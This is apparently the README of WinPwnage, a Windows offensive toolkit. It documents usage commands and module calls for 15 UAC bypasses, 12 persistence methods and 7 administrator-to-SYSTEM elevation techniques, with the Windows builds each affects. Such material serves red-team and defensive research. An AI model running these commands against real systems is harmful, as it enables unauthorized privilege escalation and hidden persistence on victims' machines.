<p align="center">
  <img src="https://i.imgur.com/wVXtzEb.png">
</p>

---

[![build_status](https://travis-ci.com/rootm0s/WinPwnage.svg?branch=master)](https://travis-ci.com/rootm0s/WinPwnage)
![python3_support](https://img.shields.io/badge/Python-3-blue.svg "Python 3")

* [Build into single executable](#building)
* [Scan for compatible methods](#scanning)
* [Importing and usage as module](#importing)
* [UAC-bypass techniques](#uac-bypass-techniques)
* [Persistence techniques](#persistence-techniques)
* [Elevation techniques](#elevation-techniques)

## Disclaimer
This tool is provided for educational and research purposes only. The authors of this project are no way responsible for any misuse of this tool.

## Building
This build works on Python >= 3.6 and puts the .exe file into the __dist__ directory. Install pyinstaller using pip command:
```batch
pip install pyinstaller
```
And run the following command:
```batch
pyinstaller --onefile main.py
```

## Scanning
Compares build number against 'Fixed In' build numbers and displays the results.
```batch
main.py --scan uac
main.py --scan persist
main.py --scan elevate
```

Example results when scanning for possible UAC methods
```
 Id:    Type:           Compatible:     Description:
 ----   ------          -----------     -------------
 1      UAC bypass      No              UAC bypass using runas
 2      UAC bypass      Yes             UAC bypass using fodhelper.exe
 3      UAC bypass      Yes             UAC bypass using slui.exe
 4      UAC bypass      Yes             UAC bypass using silentcleanup scheduled task
 5      UAC bypass      No              UAC bypass using sdclt.exe (isolatedcommand)
 6      UAC bypass      No              UAC bypass using sdclt.exe (App Paths)
 7      UAC bypass      No              UAC bypass using perfmon.exe
```

## Importing
Bypass UAC using uacMethod2
```python
from winpwnage.functions.uac.uacMethod2 import uacMethod2
uacMethod2(["c:\\windows\\system32\\cmd.exe", "/k", "whoami"])
```

Persist on system using persistMethod4
```python
from winpwnage.functions.persist.persistMethod4 import persistMethod4
persistMethod4(["c:\\windows\\system32\\cmd.exe", "/k", "whoami"], add=True)

# Removal
persistMethod4(["c:\\windows\\system32\\cmd.exe", "/k", "whoami"], add=False)
```

Elevate from administrator to SYSTEM using elevateMethod1
```python
from winpwnage.functions.elevate.elevateMethod1 import elevateMethod1
elevateMethod1(["c:\\windows\\system32\\cmd.exe", "/k", "whoami"])
```

## UAC bypass techniques
<details>
<summary>Functions (Expand/Collapse)</summary>

* UAC bypass using runas
    * Id: 1
    * Method: Windows API, this only works if UAC is set to never notify
    * Syntax: `main.py --use uac --id 1 --payload c:\\windows\\system32\\cmd.exe`
	* Works from: 7600
	* Fixed in:	n/a
* UAC bypass using fodhelper.exe
    * Id: 2
    * Method: Registry key (Class) manipulation
    * Syntax: `main.py --use uac --id 2 --payload c:\\windows\\system32\\cmd.exe`
	* Works from: 10240
	* Fixed in: n/a
* UAC bypass using slui.exe
    * Id: 3
    * Method: Registry key (Class) manipulation
    * Syntax: `main.py --use uac --id 3 --payload c:\\windows\\system32\\cmd.exe`
	* Works from: 9600
	* Fixed in: n/a
* UAC bypass using silentcleanup scheduled task
    * Id: 4
    * Method: Registry key (Environment) manipulation, this bypasses UAC's Always Notify.
    * Syntax: `main.py --use uac --id 4 --payload c:\\windows\\system32\\cmd.exe`
	* Works from: 9600
	* Fixed in: n/a
* UAC bypass using sdclt.exe (isolatedcommand)
    * Id: 5
    * Method: Registry key (Class) manipulation
    * Syntax: `main.py --use uac --id 5 --payload c:\\windows\\system32\\cmd.exe`
	* Works from: 10240
	* Fixed in: 17025
* UAC bypass using sdclt.exe (App Paths)
    * Id: 6
    * Method: Registry key (App Paths) manipulation
    * Syntax: `main.py --use uac --id 6 --payload c:\\windows\\system32\\cmd.exe`
	* Works from: 10240
	* Fixed in: 16215
* UAC bypass using perfmon.exe
    * Id: 7
    * Method: Registry key (Volatile Environment) manipulation
    * Syntax: `main.py --use uac --id 7 --payload c:\\windows\\system32\\cmd.exe`
	* Works from: 7600
	* Fixed in: 16299
* UAC bypass using eventvwr.exe
    * Id: 8
    * Method: Registry key (Class) manipulation
    * Syntax: `main.py --use uac --id 8 --payload c:\\windows\\system32\\cmd.exe`
	* Works from: 7600
	* Fixed in: 15031
* UAC bypass using compmgmtlauncher.exe
    * Id: 9
    * Method: Registry key (Class) manipulation
    * Syntax: `main.py --use uac --id 9 --payload c:\\windows\\system32\\cmd.exe`
	* Works from: 7600
	* Fixed in: 15031	
* UAC bypass using computerdefaults.exe
    * Id: 10
    * Method: Registry key (Class) manipulation
    * Syntax: `main.py --use uac --id 10 --payload c:\\windows\\system32\\cmd.exe`
	* Works from: 10240
	* Fixed in: n/a
* UAC bypass using token manipulation
    * Id: 11
    * Method: Token manipulation
    * Syntax: `main.py --use uac --id 11 --payload c:\\windows\\system32\\cmd.exe`
	* Works from: 7600
	* Fixed in: 17686
* UAC bypass using sdclt.exe (Folder)
    * Id: 12
    * Method: Registry key (Class) manipulation
    * Syntax: `main.py --use uac --id 12 --payload c:\\windows\\system32\\cmd.exe`
	* Works from: 14393
	* Fixed in: n/a
* UAC bypass using cmstp.exe
    * Id: 13
    * Method: Malicious ini file
    * Syntax: `main.py --use uac --id 13 --payload c:\\windows\\system32\\cmd.exe`
	* Works from: 7600
	* Fixed in: n/a
* UAC bypass using wsreset.exe
    * Id: 14
    * Method: Registry key (Class) manipulation
    * Syntax: `main.py --use uac --id 14 --payload c:\\windows\\system32\\cmd.exe`
	* Works from: 17134
	* Fixed in: n/a
* UAC bypass using slui.exe and changepk.exe
    * Id: 15
    * Method: Registry key (Class) manipulation
    * Syntax: `main.py --use uac --id 15 --payload c:\\windows\\system32\\cmd.exe`
	* Works from: 17763
	* Fixed in: n/a
</details>

## Persistence techniques
<details>
<summary>Functions (Expand/Collapse)</summary>

* Persistence using mofcomp.exe (SYSTEM privileges)
    * Id: 1
    * Method: Malicious mof file using EventFilter EventConsumer and binding
    * Syntax: `main.py --use persist --id 1 --payload c:\\windows\\system32\\cmd.exe`
    * Syntax for removing: `main.py --use persist --id 1 --payload c:\\windows\\system32\\cmd.exe --remove`
    * Requires: Administrator rights
    * Works from: 7600
    * Fixed in: n/a
* Persistence using schtasks.exe (SYSTEM privileges)
    * Id: 2
    * Method: Malicious scheduled task
    * Syntax: `main.py --use persist --id 2 --payload c:\\windows\\system32\\cmd.exe`
    * Syntax for removing: `main.py --use persist --id 2 --payload c:\\windows\\system32\\cmd.exe --remove`
    * Requires: Administrator rights
    * Works from: 7600
    * Fixed in: n/a
* Persistence using image file execution option and magnifier.exe
    * Id: 3
    * Method: Image File Execution Options debugger and accessibility application
    * Syntax: `main.py --use persist --id 3 --payload c:\\windows\\system32\\cmd.exe`
    * Syntax for removing: `main.py --use persist --id 3 --payload c:\\windows\\system32\\cmd.exe --remove`
    * Requires: Administrator rights
    * Works from: 7600
    * Fixed in: n/a	
* Persistence using userinit key
    * Id: 4
    * Method: Registry key (UserInit) manipulation
    * Syntax: `main.py --use persist --id 4 --payload c:\\windows\\system32\\cmd.exe`
    * Syntax for removing: `main.py --use persist --id 4 --payload c:\\windows\\system32\\cmd.exe --remove`
    * Requires: Administrator rights
    * Works from: 7600
    * Fixed in: n/a
* Persistence using HKCU run key
    * Id: 5
    * Method: Registry key (HKCU Run) manipulation
    * Syntax: `main.py --use persist --id 5 --payload c:\\windows\\system32\\cmd.exe`
    * Syntax for removing: `main.py --use persist --id 5 --payload c:\\windows\\system32\\cmd.exe --remove`
    * Requires: n/a
    * Works from: 7600
    * Fixed in: n/a
* Persistence using HKLM run key
    * Id: 6
    * Method: Registry key (HKLM Run) manipulation
    * Syntax: `main.py --use persist --id 6 --payload c:\\windows\\system32\\cmd.exe`
    * Syntax for removing: `main.py --use persist --id 6 --payload c:\\windows\\system32\\cmd.exe --remove`
    * Requires: Administrator rights
    * Works from: 7600
    * Fixed in: n/a
* Persistence using wmic.exe (SYSTEM privileges)
    * Id: 7
    * Method: Malicious mof file using EventFilter EventConsumer and binding
    * Syntax: `main.py --use persist --id 7 --payload c:\\windows\\system32\\cmd.exe`
    * Syntax for removing: `main.py --use persist --id 7 --payload c:\\windows\\system32\\cmd.exe --remove`
    * Requires: Administrator rights
    * Works from: 7600
    * Fixed in: n/a
* Persistence using startup files
    * Id: 8
    * Method: Malicious lnk file in startup directory
    * Syntax: `main.py --use persist --id 8 --payload c:\\windows\\system32\\cmd.exe`
    * Syntax for removing: `main.py --use persist --id 8 --payload c:\\windows\\system32\\cmd.exe --remove`
    * Requires: n/a
    * Works from: 7600
    * Fixed in: n/a
* Persistence using cortana windows app
    * Id: 9
    * Method: Registry key (Class) manipulation
    * Syntax: `main.py --use persist --id 9 --payload c:\\windows\\system32\\cmd.exe`
    * Syntax for removing: `main.py --use persist --id 9 --payload c:\\windows\\system32\\cmd.exe --remove`
    * Requires: n/a
    * Works from: 14393
    * Fixed in: n/a
* Persistence using people windows app
    * Id: 10
    * Method: Registry key (Class) manipulation
    * Syntax: `main.py --use persist --id 10 --payload c:\\windows\\system32\\cmd.exe`
    * Syntax for removing: `main.py --use persist --id 10 --payload c:\\windows\\system32\\cmd.exe --remove`
    * Requires: n/a
    * Works from: 14393
    * Fixed in: n/a
* Persistence using bitsadmin.exe
    * Id: 11
    * Method: Malicious bitsadmin job
    * Syntax: `main.py --use persist --id 11 --payload c:\\windows\\system32\\cmd.exe`
    * Syntax for removing: `main.py --use persist --id 11 --payload c:\\windows\\system32\\cmd.exe --remove`
    * Requires: Administrator rights
    * Works from: 7600
    * Fixed in: n/a
* Persistence using Windows Service (SYSTEM privileges)
    * Id: 12
    * Method: Malicious Windows Service
    * Syntax: `main.py --use persist --id 12 --payload c:\\windows\\system32\\cmd.exe`
    * Syntax for removing: `main.py --use persist --id 12 --payload c:\\windows\\system32\\cmd.exe --remove`
    * Requires: Administrator rights
    * Works from: 7600
    * Fixed in: n/a
</details>

## Elevation techniques
<details>
<summary>Functions (Expand/Collapse)</summary>

* Elevate from administrator to NT AUTHORITY SYSTEM using handle inheritance
    * Id: 1
    * Method: Handle inheritance
    * Syntax: `main.py --use elevate --id 1 --payload c:\\windows\\system32\\cmd.exe`
	* Requires: Administrator rights
	* Works from: 7600
	* Fixed in: n/a
* Elevate from administrator to NT AUTHORITY SYSTEM using token impersonation
    * Id: 2
    * Method: Token impersonation
    * Syntax: `main.py --use elevate --id 2 --payload c:\\windows\\system32\\cmd.exe`
	* Requires: Administrator rights
	* Works from: 7600
	* Fixed in: n/a
* Elevate from administrator to NT AUTHORITY SYSTEM using named pipe impersonation
    * Id: 3
    * Method: Named pipe impersonation
    * Syntax: `main.py --use elevate --id 3 --payload c:\\windows\\system32\\cmd.exe`
	* Requires: Administrator rights
	* Works from: 7600
	* Fixed in: n/a
* Elevate from administrator to NT AUTHORITY SYSTEM using schtasks.exe (non interactive)
    * Id: 4
    * Method: Malicious scheduled task that gets deleted once used
    * Syntax: `main.py --use elevate --id 4 --payload c:\\windows\\system32\\cmd.exe`
	* Requires: Administrator rights
	* Works from: 7600
	* Fixed in: n/a
* Elevate from administrator to NT AUTHORITY SYSTEM using wmic.exe (non interactive)
    * Id: 5
    * Method: Malicious mof file using EventFilter EventConsumer and binding that gets deleted once used
    * Syntax: `main.py --use elevate --id 5 --payload c:\\windows\\system32\\cmd.exe`
	* Requires: Administrator rights
	* Works from: 7600
	* Fixed in: n/a
* Elevate from administrator to NT AUTHORITY SYSTEM using Windows Service (non interactive)
    * Id: 6
    * Method: Malicious Windows Service that gets deleted once used
    * Syntax: `main.py --use elevate --id 6 --payload c:\\windows\\system32\\cmd.exe`
	* Requires: Administrator rights
	* Works from: 7600
	* Fixed in: n/a
* Elevate from administrator to NT AUTHORITY SYSTEM using mofcomp.exe (non interactive)
    * Id: 7
    * Method: Malicious mof file using EventFilter EventConsumer and binding that gets deleted once used
    * Syntax: `main.py --use elevate --id 7 --payload c:\\windows\\system32\\cmd.exe`
	* Requires: Administrator rights
	* Works from: 7600
	* Fixed in: n/a
</details>

## Read
* https://wikileaks.org/ciav7p1/cms/page_2621770.html
* https://wikileaks.org/ciav7p1/cms/page_2621767.html
* https://wikileaks.org/ciav7p1/cms/page_2621760.html
* https://msdn.microsoft.com/en-us/library/windows/desktop/bb736357(v=vs.85).aspx
* https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/
* https://github.com/winscripting/UAC-bypass/
* https://www.greyhathacker.net/?p=796
* https://github.com/hfiref0x/UACME
* https://bytecode77.com/hacking/exploits/uac-bypass/performance-monitor-privilege-escalation
* https://bytecode77.com/hacking/exploits/uac-bypass/slui-file-handler-hijack-privilege-escalation
* https://media.defcon.org/DEF%20CON%2025/DEF%20CON%2025%20workshops/DEFCON-25-Workshop-Ruben-Boobeb-UAC-0day-All-Day.pdf
* https://lolbas-project.github.io
